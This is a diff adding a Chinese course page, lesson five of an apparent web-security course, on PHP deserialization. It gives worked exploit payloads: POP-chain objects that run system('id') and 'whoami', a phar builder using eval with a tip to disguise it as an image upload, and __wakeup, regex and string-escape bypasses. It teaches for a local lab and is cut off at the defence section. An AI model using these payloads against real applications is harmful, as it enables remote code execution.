@@ -1,0 +1,994 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>其五 · PHP 反序列化 | 竹隐</title>
+<meta name="description" content="对象怎么变成字符串，字符串又怎么变回对象。序列化格式、魔术方法、POP 链、phar 隐性触发，以及五种绕过。">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'%3E%3Crect width='64' height='64' rx='5' fill='%23a83a2c'/%3E%3Ctext x='32' y='46' font-size='38' text-anchor='middle' fill='%23f8f2e6' font-family='KaiTi,STKaiti,serif'%3E%E7%AB%B9%3C/text%3E%3C/svg%3E">
+<link rel="stylesheet" href="../assets/css/zhulin.css">
+<link rel="stylesheet" href="../assets/css/tools.css">
+</head>
+<body>
+
+<header class="site-head">
+  <a class="brand" href="../index.html">
+    <span class="seal">竹</span>
+    <span class="brand-text">
+      <b>竹隐</b>
+      <em>JNSEC &middot; WEB 26</em>
+    </span>
+  </a>
+  <nav class="site-nav" aria-label="站点导航">
+    <a href="../index.html">山门</a>
+    <a href="week01.html">其一</a>
+    <a href="week02.html">其二</a>
+    <a href="week03.html">其三</a>
+    <a href="week04.html">其四</a>
+    <a href="week05.html" aria-current="page">其五 · 反序列化</a>
+    <a href="../roadmap.html">路线</a>
+  </nav>
+</header>
+
+<main class="reader">
+
+  <article>
+    <div class="juan-title">
+      <span class="plate">其五</span>
+      <h1>PHP 反序列化</h1>
+    </div>
+
+    <p class="juan-deck">
+      程序把对象压成一段字符串存起来，用的时候再还原。
+      问题在于：还原的时候，那段字符串里写的是什么，就是什么 ——
+      而它往往来自用户。
+    </p>
+
+    <div class="juan-meta">
+      <span>第五讲</span>
+      <span class="dot">&middot;</span>
+      <span>序列化格式 / 魔术方法 / POP 链 / 五种绕过</span>
+      <span class="dot">&middot;</span>
+      <span>含 1 个反序列化靶场</span>
+    </div>
+
+    <div class="prose">
+
+      <h2 id="s-intro" class="nonum" style="margin-top:2.4rem">这一讲在讲什么</h2>
+
+      <p>
+        先直觉地想一件事：
+      </p>
+
+      <blockquote>
+        <p>如果程序会把一段<strong>字符串</strong>还原成<strong>对象</strong>，而这段字符串是你传进去的，</p>
+        <p>那你其实可以直接<em>画</em>出一个对象 —— 指定它的类、它的每个属性、属性里再放什么。</p>
+      </blockquote>
+
+      <p>
+        一个正常的对象，属性值由代码逻辑决定。而你"画"出来的对象，
+        <strong>每个属性都由你说了算</strong>。当这个对象后续被使用时，
+        它就会带着你给的值，走进原本不是为它准备的那条路。
+      </p>
+
+      <p>
+        这就是反序列化漏洞的全部核心。剩下的魔术方法、POP 链、phar，
+        都是在解决一个问题：<strong>怎么让这个"假对象"真的被用起来，并且用到危险的地方。</strong>
+      </p>
+
+      <p>
+        这一讲比前几讲都要绕，因为它要求你能同时看懂三样东西：
+        序列化字符串长什么样、程序里哪个方法会被自动调用、这两者怎么接上。
+      </p>
+
+
+      <h2 id="s-class">先把类和对象捡回来</h2>
+
+      <p>
+        第二讲讲 Java 时说过 OOP，PHP 这边是同一套概念，只是语法不同。
+        快速过一遍，重点看几个后面会用到的细节。
+      </p>
+
+      <pre><code>&lt;?php
+class student {
+    public $name;      // 属性（变量）
+    public $class;
+
+    function info() {  // 方法（函数）
+        echo "姓名：" . $this-&gt;name . "，班级：" . $this-&gt;class;
+    }
+}
+
+$wang = new student();          // 创建对象
+$wang-&gt;name = "anchun";        // 给属性赋值
+$wang-&gt;class = "人工智能25";
+$wang-&gt;info();                 // 调用方法
+?&gt;</code></pre>
+
+      <p>
+        类是一张图纸，对象是按图纸盖出来的房子。这句话在别处听过，这里再补一句：
+        <strong>反序列化等于"跳过施工队，直接给你一张能住人的房子"</strong> ——
+        你可以把这栋房子的每个房间改成你想要的样子，哪怕图纸上没这么设计。
+      </p>
+
+      <h3>三个访问修饰符</h3>
+
+      <table>
+        <thead><tr><th style="width:8rem">修饰符</th><th>类内部</th><th>子类</th><th>类外部</th></tr></thead>
+        <tbody>
+          <tr><td><code>public</code></td><td>能</td><td>能</td><td>能</td></tr>
+          <tr><td><code>protected</code></td><td>能</td><td>能</td><td><strong>不能</strong></td></tr>
+          <tr><td><code>private</code></td><td>能</td><td><strong>不能</strong></td><td><strong>不能</strong></td></tr>
+        </tbody>
+      </table>
+
+      <p>
+        在正常代码里，这三个是封装的手段。但在反序列化里，它们变成了一个<strong>格式问题</strong> ——
+        因为私有和保护属性在序列化字符串里的名字前面会多几个看不见的字节。
+        下一节细讲。
+      </p>
+
+
+      <h2 id="s-serialize">序列化：对象怎么变成字符串</h2>
+
+      <p>
+        序列化就是把对象压成一串文本，方便存文件、传网络。
+        反过来，把这串文本还原成对象，叫反序列化。
+      </p>
+
+      <table>
+        <thead><tr><th style="width:8rem">方向</th><th style="width:9rem">过程</th><th>函数</th></tr></thead>
+        <tbody>
+          <tr><td>序列化</td><td>对象 → 字符串</td><td><code>serialize()</code></td></tr>
+          <tr><td>反序列化</td><td>字符串 → 对象</td><td><code>unserialize()</code></td></tr>
+        </tbody>
+      </table>
+
+      <h3>先看基础类型</h3>
+
+      <pre><code>serialize(34)          →  i:34;
+serialize('uusama')    →  s:6:"uusama";
+serialize(true)        →  b:1;
+serialize(NULL)        →  N;
+serialize(['a'=&gt;1,'b'=&gt;2]) →  a:2:{s:1:"a";i:1;s:1:"b";i:2;}</code></pre>
+
+      <p>每种类型一个字母开头，后面跟它的内容：</p>
+
+      <ul>
+        <li><code>i:</code> 整数（integer）</li>
+        <li><code>s:</code> 字符串 —— <strong>格式是 <code>s:长度:"内容";</code></strong>，长度很重要</li>
+        <li><code>b:</code> 布尔（1 真 0 假）</li>
+        <li><code>N;</code> 空值</li>
+        <li><code>a:</code> 数组 —— <code>a:元素个数:{键值对...}</code></li>
+        <li><code>O:</code> 对象</li>
+      </ul>
+
+      <p>
+        注意 <code>s:6:"uusama"</code> 里的那个 <code>6</code> ——
+        <strong>它告诉 PHP"后面读 6 个字符"</strong>。
+        这个长度如果写错了，反序列化就会失败。
+        记住这一点，后面讲字符串逃逸时全靠它。
+      </p>
+
+      <h3>对象的格式</h3>
+
+      <pre><code>&lt;?php
+class CC {
+    public $user;
+    private $pwd;
+
+    public function setPwd($pwd) {
+        $this-&gt;pwd = $pwd;
+    }
+}
+
+$a = new CC();
+$a-&gt;user = "user";
+$a-&gt;setPwd("pwd");
+
+echo serialize($a);
+?&gt;</code></pre>
+
+      <p>输出：</p>
+
+      <pre><code>O:2:"CC":2:{s:4:"user";s:4:"user";s:7:"CCpwd";s:3:"pwd";}</code></pre>
+
+      <p>拆开看：</p>
+
+      <table>
+        <thead><tr><th style="width:9rem">片段</th><th>含义</th></tr></thead>
+        <tbody>
+          <tr><td><code>O:</code></td><td>这是个对象（Object）</td></tr>
+          <tr><td><code>2:"CC"</code></td><td>类名长度 2，类名 <code>CC</code></td></tr>
+          <tr><td><code>2:{...}</code></td><td>这个对象有 <strong>2 个属性</strong></td></tr>
+          <tr><td><code>s:4:"user"</code></td><td>属性名 user（4 个字符）</td></tr>
+          <tr><td><code>s:4:"user"</code></td><td>属性值 user</td></tr>
+          <tr><td><code>s:7:"CCpwd"</code></td><td>属性名 —— <strong>注意这里</strong>，长度 7，内容是 <code>CC</code> + <code>pwd</code></td></tr>
+        </tbody>
+      </table>
+
+      <h3>私有属性那几个看不见的字节</h3>
+
+      <p>
+        上面那个 <code>s:7:"CCpwd"</code>，其实真实内容是：
+      </p>
+
+      <pre><code>\00CC\00pwd</code></pre>
+
+      <p>
+        <code>\00</code> 是二进制的 0 字节。<strong>私有属性序列化后，名字前后各加一个 <code>\00</code> 和类名。</strong>
+      </p>
+
+      <p>所以长度是：<code>1</code>（\00）+ <code>2</code>（类名 CC）+ <code>1</code>（\00）+ <code>3</code>（pwd）= <strong>7</strong>。</p>
+
+      <p>两种修饰符的规则：</p>
+
+      <table>
+        <thead><tr><th style="width:8rem">修饰符</th><th style="width:12rem">名字前缀</th><th>长度怎么算</th></tr></thead>
+        <tbody>
+          <tr><td><code>public</code></td><td>无</td><td>原名长度</td></tr>
+          <tr><td><code>protected</code></td><td><code>\00*\00</code></td><td>原名 + 3</td></tr>
+          <tr><td><code>private</code></td><td><code>\00类名\00</code></td><td>原名 + 2 + 类名长度</td></tr>
+        </tbody>
+      </table>
+
+      <p>
+        URL 编码之后，<code>\00</code> 会变成 <code>%00</code>。
+        所以你在浏览器地址栏或者 POST 里传 payload 的时候，
+        私有属性的 payload 会长这样：
+      </p>
+
+      <pre><code>O:2:"CC":2:{s:4:"user";s:4:"user";s:7:"%00CC%00pwd";s:3:"pwd";}</code></pre>
+
+      <div class="note pit">
+        <span class="note-tag">这个坑几乎人人踩一次</span>
+        <p>
+          改私有属性的值时，<strong>长度算错了就整个 payload 废掉</strong>。
+          比如把 <code>s:3:"pwd"</code> 改成 <code>s:5:"abcd"</code>，
+          长度 5 对应 4 个字符，反序列化直接报错。
+        </p>
+        <p>
+          改值的时候一定要顺手改长度。写脚本生成 payload 最省心。
+        </p>
+      </div>
+
+
+      <h2 id="s-magic">魔术方法：反序列化的触发点</h2>
+
+      <p>
+        魔术方法是一批以 <code>__</code> 开头的特殊函数。
+        它们<strong>不用你显式调用</strong>，只要对对象做了某个操作，PHP 自己会调。
+      </p>
+
+      <p>
+        反序列化之所以危险，就是因为其中几个魔术方法会在"还原对象"的过程中
+        <strong>自动执行</strong> —— 而那时候对象的属性已经是攻击者指定的值了。
+      </p>
+
+      <table>
+        <thead><tr><th style="width:11rem">方法</th><th>什么时候触发</th></tr></thead>
+        <tbody>
+          <tr><td><code>__construct()</code></td><td>对象创建时</td></tr>
+          <tr><td><code>__destruct()</code></td><td><strong>对象销毁时</strong></td></tr>
+          <tr><td><code>__sleep()</code></td><td>序列化之前</td></tr>
+          <tr><td><code>__wakeup()</code></td><td><strong>反序列化之后</strong></td></tr>
+          <tr><td><code>__toString()</code></td><td>对象被当成字符串用</td></tr>
+          <tr><td><code>__invoke()</code></td><td>对象被当成函数调用</td></tr>
+          <tr><td><code>__call()</code></td><td>调用一个不存在的方法</td></tr>
+          <tr><td><code>__get()</code></td><td>读一个不存在的属性</td></tr>
+          <tr><td><code>__set()</code></td><td>给不存在的属性赋值</td></tr>
+          <tr><td><code>__isset()</code></td><td>对不可访问属性用 <code>isset()</code></td></tr>
+          <tr><td><code>__unset()</code></td><td>对不可访问属性用 <code>unset()</code></td></tr>
+          <tr><td><code>__clone()</code></td><td>用 <code>clone</code> 复制之后</td></tr>
+        </tbody>
+      </table>
+
+      <p>
+        <strong>反序列化时，只有两个会真正被牵动：<code>__wakeup</code>（还原完马上调）和
+        <code>__destruct</code>（对象被回收时调）。</strong>
+        其余的，得等这个对象被拿去做别的事才会触发 —— 那正是 POP 链要解决的。
+      </p>
+
+      <h3>最朴素的一个例子：__destruct 执行命令</h3>
+
+      <pre><code>&lt;?php
+class CC {
+    public $cmd = "id";
+
+    function __destruct() {
+        system($this-&gt;cmd);     // 危险动作
+    }
+}
+?&gt;</code></pre>
+
+      <p>
+        正常使用时，这段代码没有安全风险 —— 因为 <code>$cmd</code> 是写死在代码里的。
+        但如果我们能控制反序列化的输入：
+      </p>
+
+      <pre><code>O:2:"CC":1:{s:3:"cmd";s:18:"echo 'hello world'";}</code></pre>
+
+      <p>
+        这个字符串被 <code>unserialize()</code> 之后，会创建出一个 <code>CC</code> 对象，
+        它的 <code>cmd</code> 是 <code>echo 'hello world'</code>。
+        脚本结束时对象被销毁 → 触发 <code>__destruct</code> → <code>system()</code> 执行了我们的命令。
+      </p>
+
+      <p>
+        <strong>整个漏洞链条只有两环：可控的输入 → 危险的魔术方法。</strong>
+        剩下的所有内容，都是把这两环接在一起的手段。
+      </p>
+
+      <h3>__wakeup 为什么经常是"防御"</h3>
+
+      <p>
+        开发者知道反序列化危险，就会在 <code>__wakeup</code> 里做检查：
+      </p>
+
+      <pre><code>class CC {
+    public $user = 'admin';
+    public $pwd  = 'admin';
+
+    public function __wakeup() {
+        $this-&gt;pwd = 'safe_pwd';      // 不管你传什么，都覆盖掉
+    }
+
+    public function __destruct() {
+        file_put_contents('config.php', $this-&gt;pwd);   // 危险动作
+    }
+}</code></pre>
+
+      <p>
+        <code>__wakeup</code> 会在反序列化完成的<em>第一时间</em>执行，
+        把你辛苦改好的 <code>pwd</code> 洗白。
+        所以后面第七节专门讲：怎么让它<strong>不执行</strong>。
+      </p>
+
+      <h3>其他魔术方法的触发场景（补充）</h3>
+
+      <p>
+        <code>__toString</code> 容易被低估，因为触发它的地方太多了：
+      </p>
+
+      <ul>
+        <li><code>echo $obj</code> / <code>print $obj</code></li>
+        <li>对象和字符串拼接：<code>$b = "str" . $obj;</code></li>
+        <li>参与格式化：<code>printf("%s", $obj)</code></li>
+        <li><strong>对象和字符串做 <code>==</code> 比较</strong>（PHP 会先转成字符串）</li>
+        <li>传给 <code>strlen()</code>、<code>addslashes()</code>、<code>die()</code> 这类字符串函数</li>
+        <li><code>in_array($obj, [...])</code> 里第一个参数是对象</li>
+        <li><code>class_exists()</code> 的参数</li>
+      </ul>
+
+      <p>
+        你写 payload 的时候，看到代码里有一处"把对象当字符串用"，那就是 <code>__toString</code> 的入口。
+      </p>
+
+      <div class="note">
+        <span class="note-tag">一条铁律</span>
+        <p>
+          <strong>对某个对象反序列化，只会触发它自己的魔术方法，不会顺带去触发别的类的方法。</strong>
+        </p>
+        <p>
+          想让别的类的方法也被调用，只能<em>把它做成这个对象的属性</em>，
+          等这个对象的方法去调它 —— 这就是 POP 链。
+        </p>
+      </div>
+
+      <h2 id="s-pop">POP 链：把两个类接起来</h2>
+
+      <p>
+        上一节说过，反序列化只会触发这个对象自己的魔术方法。
+        那如果一个类里<strong>没有</strong>危险的魔术方法，是不是就安全了？
+      </p>
+
+      <p>
+        不是。因为它的魔术方法里可能调用了一个属性 —— 而那个属性，可以是你指定的对象。
+      </p>
+
+      <h3>POP 是什么意思</h3>
+
+      <p>
+        <strong>Property-Oriented Programming</strong>，面向属性编程。
+        名字起得挺玄，说人话就是：
+      </p>
+
+      <blockquote>
+        <p>不去改代码，只改对象的属性，让程序自己沿着原有的调用路径，走到你希望它去的地方。</p>
+      </blockquote>
+
+      <p>三步：</p>
+
+      <ol>
+        <li><strong>找起点</strong> —— 一个会被自动触发的魔术方法（<code>__destruct</code> / <code>__wakeup</code>）</li>
+        <li><strong>找终点</strong> —— 一个危险函数（<code>system</code> / <code>eval</code> / <code>file_put_contents</code> / <code>include</code>）</li>
+        <li><strong>接起来</strong> —— 起点里调用的某个属性，把它换成能走到终点的那条路上的对象</li>
+      </ol>
+
+      <h3>一个完整的例子</h3>
+
+      <p>假设有这四个类：</p>
+
+      <pre><code>class Logger {
+    public $handler;
+    public function __construct() { $this-&gt;handler = new FileHandler(); }
+    public function __destruct() {
+        $this-&gt;handler-&gt;log();      // 起点：销毁时调 handler 的 log()
+    }
+}
+
+class FileHandler {
+    public $filename = 'log.txt';
+    public function log() { echo $this-&gt;filename; }
+}
+
+class Exploit {
+    public $rce;
+    public function log() { $this-&gt;rce-&gt;execute(); }   // 中转
+}
+
+class RCE {
+    public $cmd;
+    public function execute() { system($this-&gt;cmd); }  // 终点
+}</code></pre>
+
+      <p>
+        正常业务里，<code>Logger</code> 的 <code>handler</code> 是一个 <code>FileHandler</code>，
+        结束的时候打印个日志。就这样。
+      </p>
+
+      <p>
+        但我们可以在 payload 里把 <code>handler</code> 换成 <code>Exploit</code>：
+      </p>
+
+      <pre><code>O:6:"Logger":1:{s:7:"handler";O:7:"Exploit":1:{s:3:"rce";O:3:"RCE":1:{s:3:"cmd";s:2:"id";}}}</code></pre>
+
+      <p>反序列化之后，调用链变成：</p>
+
+      <pre><code>Logger::__destruct()
+  → $this-&gt;handler-&gt;log()         // handler 现在是 Exploit
+    → Exploit::log()
+      → $this-&gt;rce-&gt;execute()     // rce 是 RCE
+        → RCE::execute()
+          → system("id")          // 命令执行</code></pre>
+
+      <p>
+        <strong>代码一行没改，但行为完全变了。</strong>
+        这就是"面向属性编程"的含义 —— 你操纵的不是代码，是对象之间的关系。
+      </p>
+
+      <h3>跨类构造，一样的打法</h3>
+
+      <pre><code>class A {
+    public $b;
+    public function __destruct() { $this-&gt;b-&gt;methodB(); }  // 起点
+}
+class B {
+    public $c;
+    public function methodB() { $this-&gt;c-&gt;methodC(); }     // 中转
+}
+class C {
+    public $cmd;
+    public function methodC() { system($this-&gt;cmd); }      // 终点
+}</code></pre>
+
+      <p>构造的 payload：</p>
+
+      <pre><code>O:1:"A":1:{s:1:"b";O:1:"B":1:{s:1:"c";O:1:"C":1:{s:3:"cmd";s:6:"whoami";}}}</code></pre>
+
+      <p>调用链就是 <code>A::__destruct → B::methodB → C::methodC → system("whoami")</code>。</p>
+
+      <div class="note">
+        <span class="note-tag">找链子的顺序，反着来更快</span>
+        <p>
+          新手常从起点开始，一层层往下看，很容易迷路。
+          更快的办法是<strong>先把危险函数列出来</strong>（哪些类里有 <code>system</code>、<code>eval</code>），
+          然后从终点往上倒推：谁调用了这个方法？那个调用者又是谁调用的？
+        </p>
+        <p>倒推回起点，链子就通了。</p>
+      </div>
+
+      <div class="lab">
+        <div class="lab-sign">
+          <span class="stamp">实操</span>
+          <h3>打一遍反序列化靶场</h3>
+        </div>
+        <ol class="step">
+          <li>
+            跟着一键启动（端口 8085），或者进目录手动起：
+            <div class="cmd"><code>php -S 127.0.0.1:8085 router.php</code></div>
+          </li>
+          <li>第一关：改一个属性，触发 <code>__destruct</code> 里的危险动作。</li>
+          <li>第二关：链子长一点，要把一个对象塞进另一个对象的属性里。</li>
+          <li>第三关：过滤函数会把字符串替换掉 —— 利用长度字段做文章。</li>
+        </ol>
+        <p style="margin-top:1rem;margin-bottom:0;font-size:.9rem;color:var(--ink-faint)">
+          三关的源码都印在页面上。别急着改 payload，先把类之间的关系画出来。
+        </p>
+      </div>
+
+
+      <h2 id="s-phar">phar：没有 unserialize 也能触发</h2>
+
+      <p>
+        前面所有内容都建立在一个前提上：代码里得有个 <code>unserialize($_GET['x'])</code>。
+        但真实环境里，谁敢这么写？
+      </p>
+
+      <p>
+        于是有了另一类触发方式 —— <strong>不显式调用 <code>unserialize</code>，
+        而是利用 PHP 内部会自动反序列化的地方</strong>。phar 就是最经典的一个。
+      </p>
+
+      <h3>phar 文件是什么</h3>
+
+      <p>
+        PHAR 是 PHP 的打包格式，把一堆 PHP 文件打成一个归档，类似 zip。
+        它有一个特点：<strong>文件里能存一段"元数据（metadata）"，而这段元数据是<em>序列化</em>后存进去的</strong>。
+      </p>
+
+      <p>文件结构四段：</p>
+
+      <ol>
+        <li><strong>stub（标识头）</strong> —— 一段 PHP 代码，必须以 <code>__HALT_COMPILER(); ?&gt;</code> 结尾，否则 PHP 不认它是 phar</li>
+        <li><strong>manifest（清单）</strong> —— 存文件的属性、权限，<strong>还有序列化的 metadata（攻击点）</strong></li>
+        <li><strong>文件内容</strong> —— 打包进去的那些文件</li>
+        <li><strong>数字签名</strong> —— 放在最后</li>
+      </ol>
+
+      <h3>生成一个 phar</h3>
+
+      <p>
+        先改配置：<code>php.ini</code> 里找到 <code>;phar.readonly = On</code>，
+        去掉分号，把 <code>On</code> 改成 <code>Off</code>。
+        （默认只读，不加这步生成不了。）
+      </p>
+
+      <pre><code>&lt;?php
+class CC {
+    public $output = 'phpinfo();';
+    function __destruct() { eval($this-&gt;output); }
+}
+
+$phar = new Phar("exploit.phar");
+$phar-&gt;startBuffering();
+
+$phar-&gt;setStub("&lt;?php __HALT_COMPILER(); ?&gt;");   // 必须有
+$phar-&gt;setMetadata(new CC());                    // 元数据，会被序列化
+$phar-&gt;addFromString("test.txt", "test content");// 随便放点东西
+
+$phar-&gt;stopBuffering();
+?&gt;</code></pre>
+
+      <h3>怎么触发</h3>
+
+      <p>只要有一处文件操作碰到了 <code>phar://</code> 协议：</p>
+
+      <pre><code>$content = file_get_contents('phar://exploit.phar/test.txt');</code></pre>
+
+      <p><code>file_get_contents</code> 是个再普通不过的函数，代码审计时几乎没人会多看它一眼。但底层发生了这些事：</p>
+
+      <ol>
+        <li>PHP 看到 <code>phar://</code>，去解析这个归档文件</li>
+        <li>解析时读到 metadata，<strong>自动 <code>unserialize</code> 它</strong></li>
+        <li>那个 <code>CC</code> 对象被"复活"，属性是攻击者当初设的值</li>
+        <li>脚本结束，对象销毁 → <code>__destruct</code> → <code>eval</code> 执行</li>
+      </ol>
+
+      <p>
+        <strong>整个过程中没有一行 <code>unserialize()</code> 调用。</strong>
+        这就是它能绕过"代码里没有 unserialize 所以安全"这种判断的原因。
+      </p>
+
+      <div class="note pit">
+        <span class="note-tag">PHP 8.0 之后不灵了</span>
+        <p>
+          这个手法在 PHP 8.0 被收紧了：普通的文件函数遇到 <code>phar://</code> 时，
+          默认<strong>不再自动解析 metadata</strong>。
+        </p>
+        <p>
+          但如果代码显式创建 Phar 对象并调 <code>getMetadata()</code>，
+          依然会触发：
+        </p>
+        <pre><code>$phar = new Phar('exploit.phar');
+$meta = $phar-&gt;getMetadata();   // 这里还是会反序列化</code></pre>
+        <p>所以做题要先看 PHP 版本。</p>
+      </div>
+
+      <h3>怎么把 phar 传上去</h3>
+
+      <p>
+        phar 文件的后缀可以改 —— <strong>PHP 只认内容结构，不认扩展名</strong>。
+        所以把 <code>exploit.phar</code> 改名成 <code>shell.jpg</code>、<code>avatar.png</code>，
+        配合第四讲的文件上传漏洞传进去，再找一处 <code>phar://</code> 的触发点。
+      </p>
+
+      <p>
+        这就是第四讲和第五讲接在一起的地方：
+        <strong>上传负责把木马送进去，反序列化负责让它跑起来。</strong>
+      </p>
+
+
+      <h2 id="s-wakeup">绕过：让 __wakeup 不执行</h2>
+
+      <p>
+        开发者喜欢在 <code>__wakeup</code> 里做"洗白"：
+      </p>
+
+      <pre><code>class CC {
+    public $user = 'admin';
+    public $pwd  = 'admin';
+
+    public function __wakeup() {
+        $this-&gt;pwd = 'safe_pwd';              // 覆盖掉你传入的值
+    }
+    public function __destruct() {
+        file_put_contents('config.php', $this-&gt;pwd);   // 危险动作
+    }
+}</code></pre>
+
+      <p>
+        攻击者的目标就变成了：<strong>想办法让 <code>__wakeup</code> 不跑，
+        直接让 <code>__destruct</code> 用上原始值。</strong>
+      </p>
+
+      <h3>老办法：属性个数写大</h3>
+
+      <p>
+        序列化字符串里有个"属性个数"（<code>O:2:"CC":3:{...}</code> 里的那个 3）。
+        如果这个数<strong>大于真实属性个数</strong>，老版本 PHP 会认为解析失败，
+        跳过 <code>__wakeup</code> 的执行。
+      </p>
+
+      <pre><code>正常：O:2:"CC":2:{s:4:"user";s:5:"admin";s:3:"pwd";s:8:"password";}
+绕过：O:2:"CC":3:{s:4:"user";s:5:"admin";s:3:"pwd";s:8:"password";}
+                       ↑ 改成 3，但实际只有 2 个属性</code></pre>
+
+      <div class="note pit">
+        <span class="note-tag">版本限制，必须记住</span>
+        <p>
+          这个漏洞只存在于 <strong>PHP 5 &lt; 5.6.25</strong> 和 <strong>PHP 7 &lt; 7.0.10</strong>。
+          之后的版本已经修了，<strong>现在绝大多数环境打不动</strong>。
+        </p>
+        <p>
+          做题时先 <code>phpinfo()</code> 看版本。如果是新版本，直接换思路，别在这上面耗时间。
+        </p>
+      </div>
+
+      <h3>新办法：fast_destruct</h3>
+
+      <p>
+        思路变了：<strong>不指望跳过 wakeup，而是让 <code>__destruct</code> 先跑。</strong>
+      </p>
+
+      <p>
+        原理：如果反序列化过程中解析出错，PHP 会把已经建出来的对象立刻当作垃圾回收，
+        回收就会触发 <code>__destruct</code>。而此时 <code>__wakeup</code> 还没来得及跑。
+      </p>
+
+      <p>做法：破坏序列化字符串的结构，比如<strong>去掉最后那个大括号</strong>：</p>
+
+      <pre><code>合法：O:2:"CC":2:{s:4:"user";s:5:"admin";s:3:"pwd";s:6:"hacked";}
+破坏：O:2:"CC":2:{s:4:"user";s:5:"admin";s:3:"pwd";s:6:"hacked";
+                                                       ↑ 少了 }</code></pre>
+
+      <p>
+        解析到一半失败，但已经创建出来的对象会被立刻回收 ——
+        <code>__destruct</code> 先跑，用的还是原始值。
+      </p>
+
+      <div class="note secret">
+        <span class="note-tag">这条比老漏洞值钱</span>
+        <p>
+          属性个数那个绕过已经废了，但 <strong>fast_destruct 是逻辑层面的问题，新版本照样有效</strong>。
+          这也是现在做题更常用的手法。
+        </p>
+        <p>关键在于：危险的 sink（写文件、执行命令）要放在<strong>没有 __wakeup 的类</strong>上，
+        它读的那个内层对象才是被洗白的目标。</p>
+      </div>
+
+      <h3>几种破坏结构的方式</h3>
+
+      <ul>
+        <li>外层对象属性个数写大</li>
+        <li>末尾多加一个 <code>;</code></li>
+        <li>内层对象属性个数写大</li>
+        <li>直接删掉一个闭合括号</li>
+      </ul>
+
+      <p>
+        都能让解析中途失败。哪个有效，取决于版本和具体代码，逐个试。
+      </p>
+
+
+      <h2 id="s-bypass">其他绕过：引用、正则、字符串逃逸</h2>
+
+      <h3>引用绕过</h3>
+
+      <p>
+        有些题会这样写：反序列化之后，程序强行给你赋值，再要求两个字段相等。
+      </p>
+
+      <pre><code>$us = unserialize($cmd);          // 你的输入
+$us-&gt;user1 = "admin";            // 程序强行指定身份
+if ($us-&gt;user1 == $us-&gt;user2) {   // 要求"凭证"和身份一致
+    echo $flag;
+}</code></pre>
+
+      <p>
+        看起来没法过 —— <code>user1</code> 被强制改成 admin 了，<code>user2</code> 得跟着对。
+      </p>
+
+      <p>
+        但如果让两个属性<strong>指向同一块内存</strong>呢？
+      </p>
+
+      <pre><code>$a = new CC();
+$a-&gt;user2 = &amp;$a-&gt;user1;    // 引用
+echo serialize($a);
+// O:2:"CC":2:{s:5:"user1";N;s:5:"user2";R:2;}</code></pre>
+
+      <p>
+        <code>R:2;</code> 表示"引用第 2 个值"。这样一来，
+        改 <code>user1</code> 等于改 <code>user2</code>，判断自然成立。
+      </p>
+
+      <h3>正则绕过</h3>
+
+      <p>题目可能会用正则拦一下开头：</p>
+
+      <pre><code>if (preg_match('/^O:\d+/', $cmd)) die('不许传对象');</code></pre>
+
+      <p>三种绕法：</p>
+
+      <ul>
+        <li>
+          <strong>加号</strong>。<code>O:+2:"CC":...</code> —— 正则是 <code>\d+</code>，不认 <code>+</code>，
+          但 PHP 的解析器认。URL 里 <code>+</code> 要编码成 <code>%2B</code>。
+        </li>
+        <li>
+          <strong>套一层数组</strong>。<code>a:1:{i:0;O:2:"CC":...}</code> ——
+          开头变成 <code>a:</code>，正则不匹配，但里面的对象照样会被反序列化。
+        </li>
+        <li>
+          <strong>大写 S</strong>。序列化字符串里类型字母大写 <code>S</code> 时，
+          PHP 会按十六进制解析后面的字符串：
+          <pre><code>O:2:"CC":2:{S:4:"\75ser";s:5:"admin";s:3:"pwd";s:8:"password";}
+                    ↑ 大写 S，\75 是 'u' 的十六进制</code></pre>
+          这样 <code>user</code> 这个词不会以明文出现在 payload 里，能绕过字符串匹配。
+        </li>
+      </ul>
+
+      <h3>字符串逃逸：靠长度字段做文章</h3>
+
+      <p>
+        这是最能体现"序列化格式细节"的一种。前提是程序会对你传入的序列化字符串<strong>先过滤、再反序列化</strong>。
+      </p>
+
+      <h4>替换后变长</h4>
+
+      <pre><code>function filter($str) {
+    return str_replace('bb', 'ccc', $str);   // 2 个字符换成 3 个
+}</code></pre>
+
+      <p>
+        每替换一次，字符串就<strong>多出一个字符</strong>。
+        而反序列化是严格按 <code>s:长度:"内容"</code> 里的<strong>长度</strong>去读的。
+      </p>
+
+      <p>
+        于是你就可以用这些"多出来的字符"，把某个属性值的结尾提前/推迟，
+        让你写的内容<strong>跑到字符串结构里</strong>，凭空多出一个属性。
+      </p>
+
+      <p>比如目标是让类里多出一个 <code>hack</code> 属性：</p>
+
+      <pre><code>// 想让序列化结果变成这样
+O:1:"A":2:{s:4:"name";s:5:"admin";s:4:"hack";s:7:"hacker!";}
+
+// 实际操作：把 name 填成 84 个 bb 加一段 payload
+$a-&gt;name = str_repeat('bb', 42) . '";s:4:"hack";s:7:"hacker!";}';
+
+// 序列化出来 s:84:"..."
+// 过滤之后 bb 全变 ccc，长度对不上了，后面的结构就被"吃掉"重排</code></pre>
+
+      <p>
+        最终反序列化时，PHP 按 84 读完了那串 <code>c...c</code>，
+        后面那个 <code>";s:4:"hack";s:7:"hacker!";}</code> 正好接上，
+        于是 <code>hack</code> 属性就被造出来了。
+      </p>
+
+      <h4>替换后变短</h4>
+
+      <p>
+        反过来更直观：<code>str_replace('ccc', 'bb', $str)</code>，每替换一次<strong>少一个字符</strong>。
+      </p>
+
+      <p>你写 18 组 <code>ccc</code>，过滤后变成 18 组 <code>bb</code>，短了 18 个字符。</p>
+
+      <p>
+        那 18 个字符的位置，正好由<strong>后面的属性值</strong>补上来 ——
+        所以你要精心安排：让 <code>";s:4:"pass";s:3:</code> 这段被吃掉，
+        再让 pass 的值接上一段完整的属性定义。
+      </p>
+
+      <pre><code>// name 填 57 个 c（过滤后变短）
+// pass 填 ";s:4:"hack";s:7:"hacker!";}'
+// 过滤后，pass 的内容就"补"进了本该属于结构的位置</code></pre>
+
+      <div class="note">
+        <span class="note-tag">怎么算长度</span>
+        <p>
+          别手算。<strong>写脚本，序列化之后打印出来，逐字符数</strong>。
+          或者反过来：先写好目标字符串，再倒推需要多少组 bb/ccc。
+        </p>
+        <p>手算十次错九次，浪费的时间够写三个脚本。</p>
+      </div>
+
+
+      <h2 id="s-defend">防御</h2>
+
+      <p>反序列化的防御比 SQL 注入简单，因为核心只有一句话：</p>
+
+      <blockquote>
+        <p><strong>不要对用户可控的数据调用 unserialize()。</strong></p>
+      </blockquote>
+
+      <h3>四条实际做法</h3>
+
+      <table>
